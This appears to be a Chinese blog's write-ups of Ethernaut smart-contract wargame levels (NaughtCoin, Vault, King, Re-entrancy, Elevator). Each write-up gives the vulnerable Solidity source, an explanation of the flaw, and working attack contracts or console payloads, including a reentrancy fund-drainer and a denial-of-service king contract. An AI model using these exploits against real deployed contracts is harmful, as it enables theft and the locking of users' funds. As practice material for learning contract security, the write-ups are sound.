class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;openzeppelin-contracts-08/token/ERC20/ERC20.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract NaughtCoin is ERC20 &#123;</span><br><span class="line">    // string public constant name = &#x27;NaughtCoin&#x27;;</span><br><span class="line">    // string public constant symbol = &#x27;0x0&#x27;;</span><br><span class="line">    // uint public constant decimals = 18;</span><br><span class="line">    uint256 public timeLock = block.timestamp + 10 * 365 days;</span><br><span class="line">    uint256 public INITIAL_SUPPLY;</span><br><span class="line">    address public player;</span><br><span class="line"></span><br><span class="line">    constructor(address _player) ERC20(&quot;NaughtCoin&quot;, &quot;0x0&quot;) &#123;</span><br><span class="line">        player = _player;</span><br><span class="line">        INITIAL_SUPPLY = 1000000 * (10 ** uint256(decimals()));</span><br><span class="line">        // _totalSupply = INITIAL_SUPPLY;</span><br><span class="line">        // _balances[player] = INITIAL_SUPPLY;</span><br><span class="line">        _mint(player, INITIAL_SUPPLY);</span><br><span class="line">        emit Transfer(address(0), player, INITIAL_SUPPLY);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transfer(address _to, uint256 _value) public override lockTokens returns (bool) &#123;</span><br><span class="line">        super.transfer(_to, _value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Prevent the initial owner from transferring tokens until the timelock has passed</span><br><span class="line">    modifier lockTokens() &#123;</span><br><span class="line">        if (msg.sender == player) &#123;</span><br><span class="line">            require(block.timestamp &gt; timeLock);</span><br><span class="line">            _;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            _;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>用 <a target="_blank" rel="noopener" href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v5.0.2/contracts/token/ERC20/ERC20.sol"><strong>ERC20</strong></a> 标准定义了以上合约；</p>
<p><code>lockTokens()</code> 这个 modifer 决定自合约被部署的开始往后十年内，<code>transfer</code> 函数对 <code>player</code> 禁用；</p>
<p>查看 <a target="_blank" rel="noopener" href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v5.0.2/contracts/token/ERC20/ERC20.sol"><strong>ERC20</strong></a> ，发现可以用另外一个函数<code>transferFrom()</code>进行转账操作，看一下这个函数有哪些限制： </p>
<p><strong>part of ERC20 source</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">   function transferFrom(address from, address to, uint256 value) public virtual returns (bool) &#123;</span><br><span class="line">       address spender = _msgSender();</span><br><span class="line">       _spendAllowance(from, spender, value);</span><br><span class="line">       _transfer(from, to, value);</span><br><span class="line">       return true;</span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line">   // 消耗 Allowance ， Allowance 是什么 ？</span><br><span class="line">   function _spendAllowance(address owner, address spender, uint256 value) internal virtual &#123;</span><br><span class="line">       uint256 currentAllowance = allowance(owner, spender);</span><br><span class="line">       if (currentAllowance != type(uint256).max) &#123;</span><br><span class="line">           if (currentAllowance &lt; value) &#123;</span><br><span class="line">               revert ERC20InsufficientAllowance(spender, currentAllowance, value);</span><br><span class="line">           &#125;</span><br><span class="line">           unchecked &#123;</span><br><span class="line">               _approve(owner, spender, currentAllowance - value, false);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line">   // 查询 allowances ，猜测 allowances 是 owner 给 spender 的额度？</span><br><span class="line">   function allowance(address owner, address spender) public view virtual returns (uint256) &#123;</span><br><span class="line">       return _allowances[owner][spender];</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">// 定义</span><br><span class="line">mapping(address account =&gt; mapping(address spender =&gt; uint256)) private _allowances;</span><br><span class="line">   </span><br><span class="line">  	// 可以修改 _allowances ，看看对外函数</span><br><span class="line">   function _approve(address owner, address spender, uint256 value, bool emitEvent) internal virtual &#123;</span><br><span class="line">       if (owner == address(0)) &#123;</span><br><span class="line">           revert ERC20InvalidApprover(address(0));</span><br><span class="line">       &#125;</span><br><span class="line">       if (spender == address(0)) &#123;</span><br><span class="line">           revert ERC20InvalidSpender(address(0));</span><br><span class="line">       &#125;</span><br><span class="line">       _allowances[owner][spender] = value;</span><br><span class="line">       if (emitEvent) &#123;</span><br><span class="line">           emit Approval(owner, spender, value);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line">   // 猜测正确</span><br><span class="line">   function approve(address spender, uint256 value) public virtual returns (bool) &#123;</span><br><span class="line">       address owner = _msgSender();</span><br><span class="line">       _approve(owner, spender, value);</span><br><span class="line">       return true;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line">   // 执行转账，更新余额</span><br><span class="line">       function _transfer(address from, address to, uint256 value) internal &#123;</span><br><span class="line">       if (from == address(0)) &#123;</span><br><span class="line">           revert ERC20InvalidSender(address(0));</span><br><span class="line">       &#125;</span><br><span class="line">       if (to == address(0)) &#123;</span><br><span class="line">           revert ERC20InvalidReceiver(address(0));</span><br><span class="line">       &#125;</span><br><span class="line">       _update(from, to, value);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>所以可以先用<code>player</code>调<code>approve()</code>把所有额度给第三个合约，然后再用第三方合约调<code>transferFrom()</code>把<code>balance()</code>悉数转出去； </p>
<h3 id="题解-1"><a href="#题解-1" class="headerlink" title="题解"></a>题解</h3><p><strong>approve</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 注意这个控制台操作传字符串，大数 js 处理不动</span></span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">approve</span>(<span class="string">&#x27;0x142bB6fE56436bcB1DA7788AceB35b34899ea3C2&#x27;</span>,<span class="string">&#x27;1000000000000000000000000&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p><strong>attack contract (0x142bB6fE56436bcB1DA7788AceB35b34899ea3C2)</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract NaughtCoinAttack&#123;</span><br><span class="line">    address private player;</span><br><span class="line">    address private instant;</span><br><span class="line"></span><br><span class="line">    event log(bool);</span><br><span class="line"></span><br><span class="line">    constructor(address _player,address _instant) &#123;</span><br><span class="line">        player = _player;</span><br><span class="line">        instant = _instant;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function exp() public &#123;</span><br><span class="line">        bytes memory data;</span><br><span class="line">        (, data)=instant.call(abi.encodeWithSignature(&quot;balanceOf(address)&quot;,player));</span><br><span class="line">        uint256 balance = abi.decode(data, (uint256));</span><br><span class="line">        (bool success, ) =  instant.call(abi.encodeWithSignature(&quot;transferFrom(address, address, uint256)&quot;, player, address(this), balance));</span><br><span class="line">        emit log(success);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="莫"><a href="#莫" class="headerlink" title="莫"></a>莫</h2><p>只肖数日便忘掉了人生的所有伤痛，就好像它们未曾来过。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://qst137.github.io/2024/09/03/2024-09-03-%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B4%B0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="QST137">
      <meta itemprop="description" content="苍山岁岁有人去，唯愿洱海生白波。">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="QST2's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/09/03/2024-09-03-%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B4%B0/" class="post-title-link" itemprop="url">区块链学习之贰</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2024-09-03 00:00:00" itemprop="dateCreated datePublished" datetime="2024-09-03T00:00:00+08:00">2024-09-03</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-09-19 21:15:54" itemprop="dateModified" datetime="2024-09-19T21:15:54+08:00">2024-09-19</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="区块链学习之贰"><a href="#区块链学习之贰" class="headerlink" title="区块链学习之贰"></a>区块链学习之贰</h1><p>逐渐硬核起来了；</p>
<h2 id="ethernaut-Vault"><a href="#ethernaut-Vault" class="headerlink" title="ethernaut - Vault"></a>ethernaut - Vault</h2><p><strong>description</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">// Unlock the vault to pass the level!</span><br></pre></td></tr></table></figure>

<p><strong>source</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Vault &#123;</span><br><span class="line">    bool public locked;</span><br><span class="line">    bytes32 private password;</span><br><span class="line"></span><br><span class="line">    constructor(bytes32 _password) &#123;</span><br><span class="line">        locked = true;</span><br><span class="line">        password = _password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function unlock(bytes32 _password) public &#123;</span><br><span class="line">        if (password == _password) &#123;</span><br><span class="line">            locked = false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>区块链上数据都是透明的，<code>private</code>变量可读。</p>
<h3 id="区块链上变量的存储"><a href="#区块链上变量的存储" class="headerlink" title="区块链上变量的存储"></a>区块链上变量的存储</h3><p>从第一个变量开始，从右往左存储，试图填满一个插槽（32字节），遇到该插槽剩余空间不够的，转向下一个插槽；</p>
<p>读取时使用：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">web3.<span class="property">eth</span>.<span class="title function_">getStorageAt</span>(address,slotID);</span><br></pre></td></tr></table></figure>

<h4 id="变长数组的存储方式"><a href="#变长数组的存储方式" class="headerlink" title="变长数组的存储方式"></a>变长数组的存储方式</h4><p>变长数组，由于存储时无法确定要占用多少<code>storage</code>，所以采取一种特殊的存储方式：</p>
<ol>
<li><p>占用一个 slot 来存储变长数组的长度，该 slot 的编号记作 n ；</p>
</li>
<li><p>存储的 slot 编号为：<code>SHA3(n)+i</code>，i 根据存储需要可以增加；</p>
</li>
<li><p>slot 实际值为 <code>SHA3(slot编号)</code>；</p>
</li>
</ol>
<p>以上；</p>
<h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><p>得到密码即可，<code>bytes32</code>独占一个 slot 。</p>
<p><strong>payload</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> web3.<span class="property">eth</span>.<span class="title function_">getStorageAt</span>(instance,<span class="number">0x1</span>);</span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">unlock</span>(<span class="string">&#x27;0x412076657279207374726f6e67207365637265742070617373776f7264203a29&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>甚至可以用<code>getStorageAt()</code>读一下<code>locked</code>，即使它是<code>public</code>的；</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> web3.<span class="property">eth</span>.<span class="title function_">getStorageAt</span>(instance,<span class="number">0x0</span>);</span><br></pre></td></tr></table></figure>

<p><code>locked</code>是<code>false</code>了；</p>
<h3 id="长进"><a href="#长进" class="headerlink" title="长进"></a>长进</h3><p>读变量可以形成一个习惯，全用<code>getStorageAt()</code>去读；</p>
<h2 id="ethernaut-King"><a href="#ethernaut-King" class="headerlink" title="ethernaut - King"></a>ethernaut - King</h2><p><strong>description</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// The contract below represents a very simple game: whoever sends it an amount of ether that is larger than the current prize becomes the new king. On such an event, the overthrown king gets paid the new prize, making a bit of ether in the process! As ponzi as it gets xD</span><br><span class="line"></span><br><span class="line">// Such a fun game. Your goal is to break it.</span><br><span class="line"></span><br><span class="line">// When you submit the instance back to the level, the level is going to reclaim kingship. You will beat the level if you can avoid such a self proclamation.</span><br></pre></td></tr></table></figure>

<p>交钱获取王位，并避免你的对手在你<code>submit</code>的时候夺回王位；</p>
<p><strong>source</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract King &#123;</span><br><span class="line">    address king;</span><br><span class="line">    uint256 public prize;</span><br><span class="line">    address public owner;</span><br><span class="line"></span><br><span class="line">    constructor() payable &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">        king = msg.sender;</span><br><span class="line">        prize = msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        require(msg.value &gt;= prize || msg.sender == owner);</span><br><span class="line">        payable(king).transfer(msg.value);</span><br><span class="line">        king = msg.sender;</span><br><span class="line">        prize = msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _king() public view returns (address) &#123;</span><br><span class="line">        return king;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>砸币是砸不过机器人的，关注<code>receive()</code>函数：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">receive() external payable &#123;</span><br><span class="line">        require(msg.value &gt;= prize || msg.sender == owner);</span><br><span class="line">        payable(king).transfer(msg.value);</span><br><span class="line">        king = msg.sender;</span><br><span class="line">        prize = msg.value;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>对手试图夺回王位，<code>transfer()</code>给目标合约这个过程是可控的，我们可以这个过程中把交易<code>revert()</code>掉；</p>
<h3 id="题解-1"><a href="#题解-1" class="headerlink" title="题解"></a>题解</h3><p><strong>查看当前<code>prize</code></strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> web3.<span class="property">eth</span>.<span class="title function_">getStorageAt</span>(instance,<span class="number">0x1</span>);</span><br><span class="line"><span class="comment">// &#x27;275676239076594894563100840737553034228913209542&#x27;</span></span><br><span class="line">web3.<span class="property">utils</span>.<span class="title function_">hexToNumberString</span>(<span class="string">&#x27;0x00000000000000000000000000000000000000000000000000038d7ea4c68000&#x27;</span>)</span><br><span class="line"><span class="comment">// &#x27;1000000000000000&#x27;</span></span><br></pre></td></tr></table></figure>

<p><strong>attack contract</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract KingAttack &#123;</span><br><span class="line">    address public target;</span><br><span class="line"></span><br><span class="line">    constructor(address targ) public payable &#123;</span><br><span class="line">        target = targ;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function exp() payable public &#123;</span><br><span class="line">    	// 如此 transfer ，自定义 gas ， transfer 默认的 gas 不足以执行 instant 的 receive()</span><br><span class="line">    	payable(target).call&#123;value:address(this).balance,gas:1000000&#125;(&quot;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        revert();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>创建时给 2000000000000000 wei ；</p>
<p>尝试 submit ，成功；</p>
<h3 id="长进-1"><a href="#长进-1" class="headerlink" title="长进"></a>长进</h3><p>向一般题目合约转账时，可以自定义<code>gas</code>为<code>1000000</code>或者默认发送所有<code>gas</code>；</p>
<h2 id="ethernaut-Re-entrancy"><a href="#ethernaut-Re-entrancy" class="headerlink" title="ethernaut - Re-entrancy"></a>ethernaut - Re-entrancy</h2><p>大名鼎鼎的重入漏洞；</p>
<p><strong>description</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">// The goal of this level is for you to steal all the funds from the contract.</span><br><span class="line"></span><br><span class="line">  // Things that might help:</span><br><span class="line"></span><br><span class="line">// Untrusted contracts can execute code where you least expect it.</span><br><span class="line">// Fallback methods</span><br><span class="line">// Throw/revert bubbling</span><br><span class="line">// Sometimes the best way to attack a contract is with another contract.</span><br><span class="line">// See the &quot;?&quot; page above, section &quot;Beyond the console&quot;</span><br></pre></td></tr></table></figure>

<p><strong>source</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.12;</span><br><span class="line"></span><br><span class="line">import &quot;openzeppelin-contracts-06/math/SafeMath.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Reentrance &#123;</span><br><span class="line">    using SafeMath for uint256;</span><br><span class="line"></span><br><span class="line">    mapping(address =&gt; uint256) public balances;</span><br><span class="line"></span><br><span class="line">    function donate(address _to) public payable &#123;</span><br><span class="line">        balances[_to] = balances[_to].add(msg.value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function balanceOf(address _who) public view returns (uint256 balance) &#123;</span><br><span class="line">        return balances[_who];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw(uint256 _amount) public &#123;</span><br><span class="line">        if (balances[msg.sender] &gt;= _amount) &#123;</span><br><span class="line">            (bool result,) = msg.sender.call&#123;value: _amount&#125;(&quot;&quot;);</span><br><span class="line">            if (result) &#123;</span><br><span class="line">                _amount;</span><br><span class="line">            &#125;</span><br><span class="line">            balances[msg.sender] -= _amount;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>观察<code>withdraw</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function withdraw(uint256 _amount) public &#123;</span><br><span class="line">       if (balances[msg.sender] &gt;= _amount) &#123;</span><br><span class="line">           (bool result,) = msg.sender.call&#123;value: _amount&#125;(&quot;&quot;);</span><br><span class="line">           if (result) &#123;</span><br><span class="line">               _amount;</span><br><span class="line">           &#125;</span><br><span class="line">           balances[msg.sender] -= _amount;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>发现<code>balances</code>的更新发生在转账之后，故而如果我在接受合约的<code>receive()</code>中再调一次<code>withdraw()</code>，此时<code>balances</code>还没有更新，也就是可以成功再次触发转账，嵌套直到余额不足使<code>call()</code>失败为止；</p>
<p>更重要的一点，<code>call()</code>不会回退，而且默认发送所有<code>gas</code>；</p>
<h3 id="题解-2"><a href="#题解-2" class="headerlink" title="题解"></a>题解</h3><p><strong>attack contract</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">interface Reentrance &#123;</span><br><span class="line">    function donate(address _to) external  payable ;</span><br><span class="line"></span><br><span class="line">    function withdraw(uint256 _amount) external payable ;</span><br><span class="line"></span><br><span class="line">    receive() external payable ;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract ReentranceAttack &#123;</span><br><span class="line">    address payable public victim;</span><br><span class="line">    Reentrance public c;</span><br><span class="line"></span><br><span class="line">    constructor (address payable  _victim) public payable &#123;</span><br><span class="line">        victim = _victim;</span><br><span class="line">        c = Reentrance(victim);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function exp() public &#123;</span><br><span class="line">        c.donate&#123;value:1000000000000000&#125;(address(this));</span><br><span class="line">        c.withdraw(1000000000000000);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function destroy() external payable &#123;</span><br><span class="line">        selfdestruct(0xde6e75832f874f0803c1685807eF1d1CD8ed8796);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        c.withdraw(1000000000000000);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以<code>destroy()</code>把自己的测试币拿回来；</p>
<h2 id="ethernaut-Elevator"><a href="#ethernaut-Elevator" class="headerlink" title="ethernaut - Elevator"></a>ethernaut - Elevator</h2><p>想起了 Rap God 里面为数不多能记住的几句歌词；</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">// Cause I know the way to get &#x27;em motivated</span><br><span class="line">// I make elevating music, you make elevator music</span><br><span class="line">// 这网易云翻译的什么积罢呢我请问了</span><br></pre></td></tr></table></figure>

<p><strong>description</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// This elevator won&#x27;t let you reach the top of your building. Right?</span><br><span class="line"></span><br><span class="line">// Things that might help:</span><br><span class="line">// Sometimes solidity is not good at keeping promises.</span><br><span class="line">// This Elevator expects to be used from a Building.</span><br></pre></td></tr></table></figure>

<p><strong>source</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface Building &#123;</span><br><span class="line">    function isLastFloor(uint256) external returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Elevator &#123;</span><br><span class="line">    bool public top;</span><br><span class="line">    uint256 public floor;</span><br><span class="line"></span><br><span class="line">    function goTo(uint256 _floor) public &#123;</span><br><span class="line">        Building building = Building(msg.sender);</span><br><span class="line"></span><br><span class="line">        if (!building.isLastFloor(_floor)) &#123;</span><br><span class="line">            floor = _floor;</span><br><span class="line">            top = building.isLastFloor(floor);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>第一次<code>isLastFloor()</code>的结果为<code>false</code>，第二次为<code>true</code>即可；</p>
